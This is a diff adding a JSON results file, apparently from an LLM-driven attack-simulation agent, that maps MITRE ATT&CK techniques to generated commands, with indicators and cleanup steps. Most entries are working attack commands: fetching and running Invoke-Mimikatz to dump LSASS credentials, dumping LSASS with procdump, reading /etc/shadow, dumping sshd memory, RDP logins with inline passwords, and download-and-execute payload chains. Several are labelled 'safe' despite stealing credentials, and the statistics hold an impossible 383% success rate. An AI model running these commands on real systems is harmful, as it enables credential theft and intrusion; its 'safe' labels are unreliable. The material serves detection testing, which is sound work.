@@ -1,0 +1,761 @@
+{
+  "timestamp": "2025-10-23T18:17:19.397020",
+  "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+  "test_mode": "real_no_mock",
+  "statistics": {
+    "agent_info": {
+      "id": "177733a4-3a60-416a-b976-86c7211c7441",
+      "name": "test_real_agent",
+      "status": "idle",
+      "uptime_seconds": 76.543594
+    },
+    "configuration": {
+      "supported_platforms": [
+        "windows",
+        "linux"
+      ],
+      "safety_level": "medium",
+      "max_commands_per_ttp": 2,
+      "use_mock_llm": false,
+      "model_name": "gemini-2.0-flash-lite"
+    },
+    "statistics": {
+      "total_ttps_processed": 6,
+      "total_commands_generated": 23,
+      "commands_by_platform": {
+        "windows": 11,
+        "linux": 12
+      },
+      "commands_by_tactic": {
+        "Credential Access": 7,
+        "Lateral Movement": 8,
+        "Initial Access": 4,
+        "Execution": 4
+      },
+      "generation_errors": 0,
+      "safety_violations": 0,
+      "successful_generations": 23,
+      "avg_generation_time_ms": 12430.210833333333,
+      "llm_api_calls": 12,
+      "last_generation_time": "2025-10-23T18:17:19.397020"
+    },
+    "performance": {
+      "success_rate": 383.33333333333337,
+      "avg_generation_time_ms": 12430.210833333333
+    }
+  },
+  "execution_result": {
+    "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+    "status": "success",
+    "timestamp": "2025-10-23T18:17:19.397020",
+    "generation_summary": {
+      "ttps_processed": 6,
+      "commands_generated": 23,
+      "generation_errors": 0,
+      "processing_time_ms": 74581.265
+    },
+    "attack_commands": [
+      {
+        "command_id": "6ee2d79a-a859-40f0-a4f7-7e59ed9c9cd2",
+        "ttp_id": "real-T1003",
+        "mitre_attack_id": "T1003",
+        "technique_name": "OS Credential Dumping",
+        "tactic": "Credential Access",
+        "platform": "windows",
+        "name": "Mimikatz - Dump LSASS Credentials (Safe Mode)",
+        "command": "powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/Mimikatz/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command \\\"\"\"\"\"\"privilege::debug\"\"\"\"\"\" -Command \\\"\"\"\"\"\"sekurlsa::logonpasswords full\"\"\"\"\"\" -OutFile C:\\\\temp\\\\mimikatz_creds.txt\"",
+        "explanation": "This command uses PowerShell to download and execute Invoke-Mimikatz, a PowerShell wrapper for Mimikatz. It first sets the necessary privileges for debugging the LSASS process (required for credential dumping) and then uses Mimikatz's 'sekurlsa::logonpasswords full' module to dump cached credentials from LSASS memory. The output is saved to a file.  This is considered safe because it operates in a controlled environment and doesn't inject malicious code. The 'full' option attempts to retrieve as much credential data as possible.",
+        "indicators": [
+          "Creation of C:\\temp\\mimikatz_creds.txt file",
+          "Event log entries related to PowerShell script execution (Event ID 4104 in Windows Event Logs under Application and Services Logs -> Microsoft -> Windows -> PowerShell -> Operational)",
+          "Potentially, security software alerts (depending on configuration)",
+          "The output file will contain password hashes and potentially plaintext passwords, depending on the environment and account types."
+        ],
+        "prerequisites": [
+          "Administrative privileges on the target system.",
+          "Internet access for downloading Invoke-Mimikatz.",
+          "Ensure PowerShell execution policy allows script execution (e.g., bypass or unrestricted).  If the execution policy is too restrictive, the command will fail."
+        ],
+        "cleanup": "Remove the C:\\temp\\mimikatz_creds.txt file.  Consider clearing the PowerShell execution history if desired.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:11.940495",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.813,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "d2344fb4-be1a-4306-b884-554fd609575c",
+        "ttp_id": "real-T1003",
+        "mitre_attack_id": "T1003",
+        "technique_name": "OS Credential Dumping",
+        "tactic": "Credential Access",
+        "platform": "windows",
+        "name": "Procdump - Dump LSASS Memory (Safe Mode)",
+        "command": "powershell \"$procdumpPath = 'C:\\temp\\procdump.exe'; if (!(Test-Path $procdumpPath)) { (New-Object Net.WebClient).DownloadFile('https://download.sysinternals.com/files/Procdump.zip', 'C:\\temp\\procdump.zip'); Expand-Archive -Path 'C:\\temp\\procdump.zip' -DestinationPath 'C:\\temp'; } & $procdumpPath -accepteula -ma lsass C:\\temp\\lsass_dump.dmp\"",
+        "explanation": "This command utilizes Sysinternals' Procdump to create a memory dump of the LSASS process. First downloads and extracts Procdump from the internet if it doesn't already exist. Then, it uses the '-ma' parameter to create a full memory dump of the LSASS process and saves it to a file.  This is considered safe because the file is created locally, and the user controls where the data is stored.  The -accepteula flag accepts the Sysinternals EULA, preventing interactive prompts.  The '-ma' option ensures all memory pages are included in the dump, maximizing the chances of capturing credentials.",
+        "indicators": [
+          "Creation of C:\\temp\\lsass_dump.dmp file",
+          "Event log entries related to PowerShell script execution (Event ID 4104 in Windows Event Logs under Application and Services Logs -> Microsoft -> Windows -> PowerShell -> Operational)",
+          "Potentially, security software alerts (depending on configuration)",
+          "The dump file (lsass_dump.dmp) can be analyzed with tools like Mimikatz or Volatility to extract credentials.  Analysis is required to reveal the data."
+        ],
+        "prerequisites": [
+          "Administrative privileges on the target system.",
+          "Internet access for downloading Procdump if it's not already present.",
+          "Ensure PowerShell execution policy allows script execution (e.g., bypass or unrestricted).  If the execution policy is too restrictive, the command will fail."
+        ],
+        "cleanup": "Remove the C:\\temp\\lsass_dump.dmp and C:\\temp\\procdump.exe files.  Also, remove the C:\\temp\\procdump.zip file if it was created.  Consider clearing the PowerShell execution history if desired.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:11.940495",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.813,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "2d0adac8-2219-4e52-98d8-bfe988267f52",
+        "ttp_id": "real-T1003",
+        "mitre_attack_id": "T1003",
+        "technique_name": "OS Credential Dumping",
+        "tactic": "Credential Access",
+        "platform": "linux",
+        "name": "Dump Shadow File Contents (Linux)",
+        "command": "sudo cat /etc/shadow",
+        "explanation": "This command attempts to dump the contents of the /etc/shadow file. The /etc/shadow file stores password hashes.  On many systems, only the root user can access the shadow file by default. This command uses `sudo` to elevate privileges and attempt to read the file.  This simulates an attacker gaining root access and attempting to extract password hashes.",
+        "indicators": [
+          "Audit logs showing `cat` being executed with `sudo`.",
+          "The /etc/shadow file contents being displayed (if successful).",
+          "Potentially, file access logs indicating access to /etc/shadow"
+        ],
+        "prerequisites": [
+          "A Linux system.",
+          "User needs sudo privileges (configured for testing).",
+          "Ensure no sensitive passwords are used on the test system."
+        ],
+        "cleanup": "No cleanup is strictly needed, as the command only reads a file.  However, review logs to ensure no unexpected configurations or changes were made.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:17.564177",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.813,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "cd74ab8b-cd1e-4880-81a0-93292986bbdc",
+        "ttp_id": "real-T1003",
+        "mitre_attack_id": "T1003",
+        "technique_name": "OS Credential Dumping",
+        "tactic": "Credential Access",
+        "platform": "linux",
+        "name": "Attempt to Read Process Memory (Linux - Requires Debugging Access)",
+        "command": "sudo gdb -p $(pidof sshd) -batch -ex 'dump memory sshd.mem 0x0 $(cat /proc/$(pidof sshd)/maps | grep r-xp | awk '{print $2}' | cut -d'-' -f2)'",
+        "explanation": "This command attempts to read the memory of the `sshd` process (OpenSSH server) using `gdb` (GNU Debugger).  This simulates an attacker trying to extract credentials from memory. It first identifies the process ID of `sshd` using `pidof`. Then, it uses `gdb` to attach to the process and dump a memory region. The memory region is determined by reading the process's memory map (`/proc/<pid>/maps`) to find the executable region (r-xp) and its end address. The `dump memory` command writes the specified memory region to a file (sshd.mem). This command is highly dependent on system configuration (e.g., ASLR settings, debugging permissions) and the target process. It may fail depending on the system configuration and the process. The exact addresses to dump are dynamic and will vary by system and process. This command is designed to be a safe, read-only operation.",
+        "indicators": [
+          "Audit logs showing `gdb` being executed with `sudo`.",
+          "The presence of a `sshd.mem` file (if successful). The file may contain sensitive data.",
+          "Process monitoring logs showing the execution of `gdb` attached to `sshd`.",
+          "Potentially, file access logs indicating access to /proc/<pid>/maps"
+        ],
+        "prerequisites": [
+          "A Linux system.",
+          "User needs sudo privileges.",
+          "The `gdb` debugger must be installed.",
+          "The OpenSSH server (`sshd`) must be running.",
+          "Debugging permissions or access to process memory must be enabled (may require specific kernel configurations or user group membership).",
+          "ASLR may interfere with identifying correct memory regions and therefore reduce the chance of success."
+        ],
+        "cleanup": "Remove the `sshd.mem` file. Review system logs for any unexpected changes or errors generated during the execution of the command. Consider restarting the `sshd` service after testing, just in case.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:17.564177",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.813,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "5f2b1624-8194-4165-b068-97d2d5a5142d",
+        "ttp_id": "real-T1021.001",
+        "mitre_attack_id": "T1021.001",
+        "technique_name": "Remote Desktop Protocol",
+        "tactic": "Lateral Movement",
+        "platform": "windows",
+        "name": "Establish RDP Connection to a Target Host (Interactive)",
+        "command": "mstsc /v:<target_ip_or_hostname> /admin",
+        "explanation": "This command initiates an interactive RDP session to a specified target host. The `/v:` parameter specifies the target IP address or hostname. The `/admin` switch connects to the console session (session 0), which can be useful if the target machine has multiple active RDP sessions. This method requires user interaction for authentication (username and password).",
+        "indicators": [
+          "Event ID 4624 (An account was successfully logged on) in Security Event Log on the target system (source IP will be attacker's IP)",
+          "Event ID 4778 (A session was reconnected to a Window station) or Event ID 4779 (A session was disconnected from a Window station) in Security Event Log on the target system (depending on how the session is closed)",
+          "Network connection from the attacking machine to port 3389 (RDP) on the target machine.",
+          "RDP process (mstsc.exe) running on the target machine.",
+          "User account login activity on the target system.",
+          "Possible creation of a .rdp file in the user's Documents folder if the connection settings are saved."
+        ],
+        "prerequisites": [
+          "A valid account with RDP access permissions on the target system.",
+          "Network connectivity between the attacking machine and the target machine.",
+          "RDP enabled on the target system (default port 3389).",
+          "The attacking machine must be able to resolve the target hostname or have the target IP address."
+        ],
+        "cleanup": "Close the RDP session. No specific cleanup commands are required beyond closing the session in the GUI.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:25.110101",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.803,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "6a38ec6d-7c67-4c2e-8ece-d78b098558b5",
+        "ttp_id": "real-T1021.001",
+        "mitre_attack_id": "T1021.001",
+        "technique_name": "Remote Desktop Protocol",
+        "tactic": "Lateral Movement",
+        "platform": "windows",
+        "name": "Attempt RDP Connection with Saved Credentials (Non-Interactive)",
+        "command": "powershell -c \"$rdp_file_path = Join-Path $env:USERPROFILE 'Documents\\test.rdp'; New-Item -ItemType File -Path $rdp_file_path -Force; $content = @('full address:s:<target_ip_or_hostname>','username:s:<username>','password:s:<password>','enablecredsspsupport:i:1'); $content | Out-File -FilePath $rdp_file_path -Encoding utf8; Start-Process mstsc -ArgumentList '/v:<target_ip_or_hostname> /f /admin /rdp `\"$rdp_file_path`\"'\"",
+        "explanation": "This PowerShell command attempts to create an RDP connection using saved credentials.  It first creates a .rdp file in the user's Documents folder. It then populates the .rdp file with the target IP or hostname, username, password, and enables CredSSP support. Finally, it starts mstsc.exe with the /v parameter (target), /f (full screen), /admin (console session), and /rdp parameter to specify the .rdp file path. This is a non-interactive method that attempts to authenticate without prompting the user, relying on the credentials provided. *IMPORTANT:*  Replace `<target_ip_or_hostname>`, `<username>`, and `<password>` with valid credentials for a safe testing environment.  Never use real production credentials for testing.",
+        "indicators": [
+          "Event ID 4624 (An account was successfully logged on) in Security Event Log on the target system (source IP will be attacker's IP) - if successful.",
+          "Event ID 4625 (An account failed to log on) in Security Event Log on the target system (source IP will be attacker's IP) - if authentication fails.",
+          "Event ID 4778 or 4779 (session connect/disconnect) in Security Event Log.",
+          "Network connection from the attacking machine to port 3389 (RDP) on the target machine.",
+          "RDP process (mstsc.exe) running on the target machine.",
+          "A .rdp file created in the user's Documents folder.",
+          "User account login activity on the target system.",
+          "If authentication fails, look for failed login attempts in the security logs."
+        ],
+        "prerequisites": [
+          "A valid account (with RDP access) on the target system is required.",
+          "Network connectivity between the attacking machine and the target machine.",
+          "RDP enabled on the target system (default port 3389).",
+          "The attacking machine must be able to resolve the target hostname or have the target IP address.",
+          "The user account on the attacking machine must have write permissions to their Documents folder."
+        ],
+        "cleanup": "Remove the created .rdp file from the Documents folder. For example: `Remove-Item -Path $env:USERPROFILE\\Documents\\test.rdp -Force`",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:25.110101",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.803,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "e03fed19-2a47-49ef-81da-dfa1da5d3ee5",
+        "ttp_id": "real-T1021.001",
+        "mitre_attack_id": "T1021.001",
+        "technique_name": "Remote Desktop Protocol",
+        "tactic": "Lateral Movement",
+        "platform": "linux",
+        "name": "Establish RDP Connection to a Windows Host using `rdesktop`",
+        "command": "rdesktop -u testuser -p 'P@sswOrd123' 192.168.1.100",
+        "explanation": "This command attempts to establish an RDP connection to a Windows host. It utilizes the `rdesktop` utility, a common open-source RDP client for Linux. The command specifies the username (`testuser`), password (`P@sswOrd123`), and the target IP address (192.168.1.100).  This assumes the Windows host has RDP enabled and is listening on the default port (3389).  This command does *not* persist the connection or attempt privilege escalation; it is purely a lateral movement attempt.",
+        "indicators": [
+          "Network traffic to port 3389 (TCP) on the target host from the attacking machine's IP address.",
+          "Logs on the target Windows host indicating an RDP login attempt from the specified user and IP address (e.g., in the Security Event Log).",
+          "Process creation on the attacking machine for `rdesktop`."
+        ],
+        "prerequisites": [
+          "The attacking machine must have `rdesktop` installed (e.g., `sudo apt install rdesktop`).",
+          "The target Windows host must have RDP enabled and be reachable from the attacking machine.",
+          "Valid credentials (username and password) for a user account on the target Windows host are required.",
+          "The attacking machine and the target host must be on the same network or have network connectivity established."
+        ],
+        "cleanup": "Close the `rdesktop` window on the attacking machine. No persistent changes are made, so no further cleanup is necessary. Consider changing the password if the test user is a real user in a production environment.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:30.080900",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.803,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "4e20724a-93fc-40db-9148-732e3df5b8d6",
+        "ttp_id": "real-T1021.001",
+        "mitre_attack_id": "T1021.001",
+        "technique_name": "Remote Desktop Protocol",
+        "tactic": "Lateral Movement",
+        "platform": "linux",
+        "name": "Attempt RDP Connection to a Windows Host using `xfreerdp` (Interactive)",
+        "command": "xfreerdp /v:192.168.1.100 /u:testuser /p:'P@sswOrd123'",
+        "explanation": "This command attempts to connect to a Windows host using `xfreerdp`, another popular RDP client. The `/v` flag specifies the target IP address (192.168.1.100), `/u` sets the username (`testuser`), and `/p` provides the password (`P@sswOrd123`). This is an interactive command. Similar to the `rdesktop` command, this command attempts to laterally move by connecting to the target host. It does not perform persistence or escalation.",
+        "indicators": [
+          "Network traffic on port 3389 (TCP) to the target host from the attacking machine.",
+          "Event logs on the target host showing an RDP login attempt (e.g., Security Event Log).",
+          "Process creation on the attacking machine for `xfreerdp`."
+        ],
+        "prerequisites": [
+          "The attacking machine must have `xfreerdp` installed (e.g., `sudo apt install freerdp-x11`).",
+          "The target Windows host must have RDP enabled and be reachable from the attacking machine.",
+          "Valid credentials (username and password) for a user account on the target Windows host are required.",
+          "The attacking machine and the target host must be on the same network or have network connectivity established."
+        ],
+        "cleanup": "Close the `xfreerdp` window. No persistent changes are made, so no further cleanup is necessary. Consider changing the password if the test user is a real user in a production environment.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:30.080900",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.803,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "42d4b012-8ecd-4744-9fd5-8c2563a537f3",
+        "ttp_id": "real-T1566.001",
+        "mitre_attack_id": "T1566.001",
+        "technique_name": "Spearphishing Attachment",
+        "tactic": "Initial Access",
+        "platform": "windows",
+        "name": "Simulate Spearphishing Attachment with a Macro-Enabled Document Download",
+        "command": "powershell -c \"Invoke-WebRequest -Uri 'http://<YOUR_WEB_SERVER_IP>/test.docm' -OutFile $env:TEMP\\test.docm; Start-Process -FilePath $env:TEMP\\test.docm\"",
+        "explanation": "This command simulates a spearphishing attack by downloading a macro-enabled Word document (.docm) from a web server.  It uses PowerShell's `Invoke-WebRequest` to retrieve the document and saves it to the temporary directory.  It then uses `Start-Process` to open the downloaded document.  The document would ideally contain a malicious VBA macro (which is not included here for safety).  This command only downloads and opens a file, simulating the initial access vector.  Replace `<YOUR_WEB_SERVER_IP>` with the IP address of a web server you control that is hosting a harmless, but macro-enabled, .docm file.  The .docm file itself should contain a benign macro that does nothing malicious, like displaying a message box.",
+        "indicators": [
+          "Network traffic to the web server IP address (HTTP GET request)",
+          "File creation event in the temporary directory (test.docm)",
+          "Process execution event for WINWORD.EXE (or the associated Office application)",
+          "Potentially, a registry key modification if the benign macro attempts it (e.g., for persistence – this is not included in the safe example)",
+          "Event log entries related to the document opening (e.g., security log, application log if the macro runs)",
+          "User interaction if the user enables macros (depending on Office security settings)"
+        ],
+        "prerequisites": [
+          "A web server accessible from the target machine (e.g., a simple Python web server: `python -m http.server` in the directory containing test.docm)",
+          "A macro-enabled Word document (.docm) named test.docm hosted on the web server.  The document must contain a benign VBA macro (e.g., a message box).  Do not include malicious code.",
+          "Appropriate permissions to execute PowerShell on the target system."
+        ],
+        "cleanup": "Delete the downloaded test.docm file from the temporary directory.  Remove any logs generated on the web server.  Remove the test.docm file from the web server.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:36.654145",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.792,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "15e279d7-7a00-4305-b5db-04699164f211",
+        "ttp_id": "real-T1566.001",
+        "mitre_attack_id": "T1566.001",
+        "technique_name": "Spearphishing Attachment",
+        "tactic": "Initial Access",
+        "platform": "windows",
+        "name": "Simulate Spearphishing Attachment using a Batch Script to Download and Execute an Office Document",
+        "command": "cmd /c \"powershell -c \\\"(New-Object System.Net.WebClient).DownloadFile('http://<YOUR_WEB_SERVER_IP>/test.docm', '$env:TEMP\\test.docm'); Start-Process '$env:TEMP\\test.docm'\\\"\"",
+        "explanation": "This command simulates a spearphishing attachment by using a batch script to download a macro-enabled Word document (.docm) from a web server. It uses PowerShell within the batch script to download the file using the .NET `WebClient` and saves it to the temporary directory. It then uses `Start-Process` to open the downloaded document. The document would ideally contain a malicious VBA macro (which is not included here for safety). Replace `<YOUR_WEB_SERVER_IP>` with the IP address of a web server you control that is hosting a harmless, but macro-enabled, .docm file. The .docm file itself should contain a benign macro that does nothing malicious, like displaying a message box.",
+        "indicators": [
+          "Network traffic to the web server IP address (HTTP GET request)",
+          "File creation event in the temporary directory (test.docm)",
+          "Process execution event for WINWORD.EXE (or the associated Office application)",
+          "Potentially, a registry key modification if the benign macro attempts it (e.g., for persistence – this is not included in the safe example)",
+          "Event log entries related to the document opening (e.g., security log, application log if the macro runs)",
+          "User interaction if the user enables macros (depending on Office security settings)"
+        ],
+        "prerequisites": [
+          "A web server accessible from the target machine (e.g., a simple Python web server: `python -m http.server` in the directory containing test.docm)",
+          "A macro-enabled Word document (.docm) named test.docm hosted on the web server. The document must contain a benign VBA macro (e.g., a message box). Do not include malicious code.",
+          "Appropriate permissions to execute CMD and PowerShell on the target system."
+        ],
+        "cleanup": "Delete the downloaded test.docm file from the temporary directory. Remove any logs generated on the web server. Remove the test.docm file from the web server.",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:36.654145",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.792,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "76ae317d-d779-46bc-98d7-05c85c6520ee",
+        "ttp_id": "real-T1566.001",
+        "mitre_attack_id": "T1566.001",
+        "technique_name": "Spearphishing Attachment",
+        "tactic": "Initial Access",
+        "platform": "linux",
+        "name": "Simulate Spearphishing Attachment with Malicious Shell Script Download via `wget` and Execution",
+        "command": "echo '#!/bin/bash\\necho \"Spearphishing payload executed!\" >> /tmp/spearphish.log\\nwhoami >> /tmp/spearphish.log' > /tmp/payload.sh && chmod +x /tmp/payload.sh && python3 -m http.server 8000 & disown && wget http://<your_ip>:8000/payload.sh -O /tmp/downloaded_payload.sh && chmod +x /tmp/downloaded_payload.sh && /tmp/downloaded_payload.sh",
+        "explanation": "This command simulates a spearphishing attack by creating a simple shell script (`payload.sh`) that writes to a log file and reveals the user. It then starts a simple HTTP server (using Python) to host the malicious script. Finally, it uses `wget` to download the script from the attacker's simulated server and executes the downloaded script. Replace `<your_ip>` with the IP address of the testing machine from which the HTTP server is running. This simulates a user opening an attachment that downloads and runs a malicious script. This is a safe simulation as it doesn't do anything destructive.",
+        "indicators": [
+          "Creation of `/tmp/payload.sh` file.",
+          "Creation of `/tmp/downloaded_payload.sh` file.",
+          "Execution of `/tmp/downloaded_payload.sh`.",
+          "Presence of `/tmp/spearphish.log` file.",
+          "Entries in `/tmp/spearphish.log` indicating execution and user context.",
+          "HTTP server logs (if enabled on the attacking machine) showing the `wget` request."
+        ],
+        "prerequisites": [
+          "A testing environment with Python 3 installed.",
+          "Network connectivity between the attacking machine (hosting the HTTP server) and the target machine.",
+          "Ensure `<your_ip>` is replaced with the correct IP address of the testing machine."
+        ],
+        "cleanup": "rm -f /tmp/payload.sh /tmp/downloaded_payload.sh /tmp/spearphish.log; kill $(ps aux | grep 'python3 -m http.server' | awk '{print $2}')",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:42.555408",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.792,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "ed1e291c-e99c-4652-b4c6-b1f70d45dd6c",
+        "ttp_id": "real-T1566.001",
+        "mitre_attack_id": "T1566.001",
+        "technique_name": "Spearphishing Attachment",
+        "tactic": "Initial Access",
+        "platform": "linux",
+        "name": "Simulate Spearphishing Attachment with Base64 Encoded Script Download and Execution",
+        "command": "echo \"#!/bin/bash\\necho 'Spearphishing payload executed via base64!' >> /tmp/spearphish_base64.log\\nwhoami >> /tmp/spearphish_base64.log\" | base64 > /tmp/encoded.txt && python3 -m http.server 8000 & disown && wget http://<your_ip>:8000/encoded.txt -O /tmp/downloaded_encoded.txt && base64 -d /tmp/downloaded_encoded.txt > /tmp/decoded_payload.sh && chmod +x /tmp/decoded_payload.sh && /tmp/decoded_payload.sh",
+        "explanation": "This simulates a spearphishing attack by creating a simple shell script, encoding it using base64, hosting the encoded script on a local HTTP server (using Python), downloading the encoded script via `wget`, decoding it using `base64 -d`, making it executable, and finally executing the decoded script. This simulates a user opening an attachment that downloads a base64 encoded script. Replace `<your_ip>` with the IP address of the testing machine from which the HTTP server is running. This is a safe simulation as it doesn't do anything destructive.",
+        "indicators": [
+          "Creation of `/tmp/encoded.txt` file.",
+          "Creation of `/tmp/downloaded_encoded.txt` file.",
+          "Creation of `/tmp/decoded_payload.sh` file.",
+          "Execution of `/tmp/decoded_payload.sh`.",
+          "Presence of `/tmp/spearphish_base64.log` file.",
+          "Entries in `/tmp/spearphish_base64.log` indicating execution and user context.",
+          "HTTP server logs (if enabled on the attacking machine) showing the `wget` request."
+        ],
+        "prerequisites": [
+          "A testing environment with Python 3 and base64 utilities installed.",
+          "Network connectivity between the attacking machine (hosting the HTTP server) and the target machine.",
+          "Ensure `<your_ip>` is replaced with the correct IP address of the testing machine."
+        ],
+        "cleanup": "rm -f /tmp/encoded.txt /tmp/downloaded_encoded.txt /tmp/decoded_payload.sh /tmp/spearphish_base64.log; kill $(ps aux | grep 'python3 -m http.server' | awk '{print $2}')",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:42.555408",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.792,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "bf3a8142-40b3-4682-a354-bb16473cf4a1",
+        "ttp_id": "real-T1059.001",
+        "mitre_attack_id": "T1059.001",
+        "technique_name": "PowerShell",
+        "tactic": "Execution",
+        "platform": "windows",
+        "name": "Download and Execute a Simple Script from a Web Server (Invoke-WebRequest)",
+        "command": "powershell -c \"Invoke-WebRequest -Uri 'http://127.0.0.1/test.ps1' -OutFile 'C:\\Users\\Public\\test.ps1'; & 'C:\\Users\\Public\\test.ps1'\"",
+        "explanation": "This command uses PowerShell to download a simple PowerShell script (test.ps1) from a local web server (127.0.0.1, simulating an attacker's server).  The downloaded script is then executed.  The test.ps1 script, for safety, should only contain benign operations like creating a file or writing to the console. This simulates a common attack pattern where an attacker hosts a malicious script and uses PowerShell to retrieve and run it.",
+        "indicators": [
+          "Network connection to 127.0.0.1 (or the specified web server address) on port 80 (or the web server's port)",
+          "Creation of the file C:\\Users\\Public\\test.ps1",
+          "Execution of PowerShell process with command-line arguments including Invoke-WebRequest and the URL.",
+          "Potentially, a file created or output written to the console, depending on the contents of test.ps1."
+        ],
+        "prerequisites": [
+          "A web server running on the local machine (or accessible from the target) serving a test.ps1 file. The test.ps1 file should be placed in the web server's document root and contain safe operations, like echo 'Hello from the test script!' or New-Item -ItemType File -Path C:\\Users\\Public\\test_output.txt.",
+          "The executing user must have appropriate permissions to create files in the C:\\Users\\Public directory."
+        ],
+        "cleanup": "Remove the downloaded script: Remove-Item -Path C:\\Users\\Public\\test.ps1 -Force",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:50.620964",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.88,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "d40edc5a-ae1c-4188-9334-a48b4f7ee012",
+        "ttp_id": "real-T1059.001",
+        "mitre_attack_id": "T1059.001",
+        "technique_name": "PowerShell",
+        "tactic": "Execution",
+        "platform": "windows",
+        "name": "Execute a Base64 Encoded PowerShell Command (EncodedCommand)",
+        "command": "powershell -EncodedCommand JABzAGUAcgB2AGUAcgAgAD0AIAIxADIANy4AMAAuADAAgAAgAC0AYQBkAGQAcgBlAHMAcwA7ACQAZgBpAGwAZQAgAD0AIAJjADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAHQAZQBzAHQALgB0AHgAdAAiADsAJAB0AGUAcwB0ACAAPQAgACcASABlAGwAbABvACAAZgByAG8AbQAgAHQAZQBzAHQAIABzAGMAcgBpAHAAdAAnADsAJAB0AGUAcwB0ACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAC0AAFAAYQB0AGgAIAAkAGYAaQBsAGUAOwBlAGMAbwAgACcASABlAGwAbABvACAAZgByAG8AbQAgAHQAZQBzAHQAIABzAGMAcgBpAHAAdAAnAA==",
+        "explanation": "This command uses the -EncodedCommand parameter to execute a base64-encoded PowerShell script. The decoded script, for safety, simply writes a string to a file and echoes it to the console.  This technique is often used to obfuscate commands, making them harder to detect by simple string-based analysis.  This simulates an attacker using encoding to hide their payload.",
+        "indicators": [
+          "Execution of a PowerShell process with the -EncodedCommand argument.",
+          "Creation of the file C:\\Users\\Public\\test.txt.",
+          "Output 'Hello from test script' to the console (or any output specified in the encoded script).",
+          "Potential detection of base64 encoded strings in process command lines or logs."
+        ],
+        "prerequisites": [
+          "The executing user must have appropriate permissions to create files in the C:\\Users\\Public directory."
+        ],
+        "cleanup": "Remove the created file: Remove-Item -Path C:\\Users\\Public\\test.txt -Force",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:50.620964",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.88,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
+        "command_id": "5c96e068-d639-45fe-9bd8-ec01dffa6ef8",
+        "ttp_id": "real-T1059.001",
+        "mitre_attack_id": "T1059.001",
+        "technique_name": "PowerShell",
+        "tactic": "Execution",
+        "platform": "linux",
+        "name": "Simulate PowerShell script execution to download a harmless file",
+        "command": "pwsh -c \"Invoke-WebRequest -Uri 'https://www.example.com' -OutFile '/tmp/example.html'\"",
+        "explanation": "This command simulates a basic PowerShell script execution on Linux using `pwsh`. It utilizes the `Invoke-WebRequest` cmdlet, which is the PowerShell equivalent of `curl` or `wget`, to download the HTML content from example.com and save it to `/tmp/example.html`. This mimics a common attacker behavior of downloading a file, though in this case, the file is benign.",
+        "indicators": [
+          "Process creation event for `pwsh`.",
+          "Network connection to `www.example.com`.",
+          "File creation event for `/tmp/example.html`.",
+          "File modification event for `/tmp/example.html`."
+        ],
+        "prerequisites": [
+          "PowerShell (pwsh) must be installed on the Linux system. This is typically done by installing PowerShell from the official Microsoft repositories.",
+          "Internet connectivity is required for the download."
+        ],
+        "cleanup": "rm /tmp/example.html",
+        "source": "gemini_llm",
+        "generated_at": "2025-10-23T18:16:54.268801",
+        "agent_id": "177733a4-3a60-416a-b976-86c7211c7441",
+        "confidence_score": 0.88,
+        "safety_level": "medium",
+        "validated": true
+      },
+      {
